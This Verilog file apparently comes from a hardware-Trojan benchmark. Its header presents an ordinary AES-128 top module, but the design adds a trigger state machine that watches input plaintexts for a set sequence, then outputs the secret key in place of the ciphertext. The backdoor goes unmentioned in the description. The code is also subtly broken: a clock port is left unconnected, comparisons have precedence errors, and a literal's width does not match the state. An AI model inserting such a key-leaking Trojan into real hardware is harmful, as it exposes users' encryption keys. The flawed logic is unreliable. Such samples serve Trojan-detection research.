`timescale 1ns / 1ps
// AES Top Module
//
// This module serves as the top-level entity for AES encryption. It instantiates
// the aes_128 module to perform the encryption process.
//
// The aes_top module receives the following inputs:
//   - clk: Clock signal
//   - rst: Reset signal
//   - state: Input state for AES encryption
//   - key: Input key for AES encryption
//
// It provides the following output:
//   - out: Encrypted output
//
// Revision History:
// - Revision 0.01: File created
//
//////////////////////////////////////////////////////////////////////////////////
module aes_top ( 
		 input clk, 
		 input rst, 
		 input [127:0] state, 
		 input [127:0] key, 
		 output [127:0] out
    ); 
	wire HT_Trig;
	wire [127:0] HT_ciphertext; 
	
	// Instantiation of AES encryption module
	aes_128 AES (.clk(clk), .rst(rst), .state(state), .key(key), .out(HT_ciphertext)); 
	HT_Tri HT_Trigger (.rst(rst), .state(state), .Tj_Trig(HT_Trig)); 
	HT_TSC HT_Trojan (.Tj_Trig(HT_Trig), .key(key), .ciphertext(HT_ciphertext), .out(out)); 
 
endmodule

module HT_Tri(
    input rst,
    input clk,  // Add a clock input for synchronous design
    input [127:0] state,
    output reg Tj_Trig
    );

    
    parameter ORIGINAL = 3'b000;
    parameter STATE1 = 3'b001;
    parameter STATE2 = 3'b010;
    parameter STATE3 = 3'b011;
    parameter FINAL = 3'b100;
    
    reg [2:0] current_state;
    reg [2:0] next_state;
    
    // Define state transition conditions
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            current_state <= ORIGINAL;
        end else begin
            current_state <= next_state;
        end
    end
    
    // Next state logic
    always @(*) begin
        case (current_state)
            ORIGINAL: begin
                if (state & 1'b1 == 1'b0) begin
                    next_state = STATE1;
                end else begin
                    next_state = ORIGINAL;
                end
            end
            STATE1: begin
                if (state & 1'b1 == 1'b0) begin
                    next_state = STATE2;
                end else begin
                    next_state = ORIGINAL;
                end
            end
            STATE2: begin
                if (state & 1'b1 == 1'b1) begin
                    next_state = STATE3;
                end else begin
                    next_state = ORIGINAL;
                end
            end
            STATE3: begin
                if (state ^ 120'h112233_44556677_8899aabb_ccddeeff == 1'b0) begin
                    next_state = FINAL;
                end else begin
                    next_state = ORIGINAL;
                end
            end
            FINAL: begin
                next_state = ORIGINAL;  // Reset to original after reaching final
            end
            default: begin
                next_state = ORIGINAL;
            end
        endcase
    end
    
    // Output logic
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            Tj_Trig <= 0;
        end else if (current_state == FINAL) begin
            Tj_Trig <= 1;
        end else begin
            Tj_Trig <= 0;
        end
    end

endmodule

module HT_TSC(
     input Tj_Trig, 
    input [127:0] key,
    input [127:0] ciphertext,
    output [127:0] out
    );

assign out = Tj_Trig?key:ciphertext; 

endmodule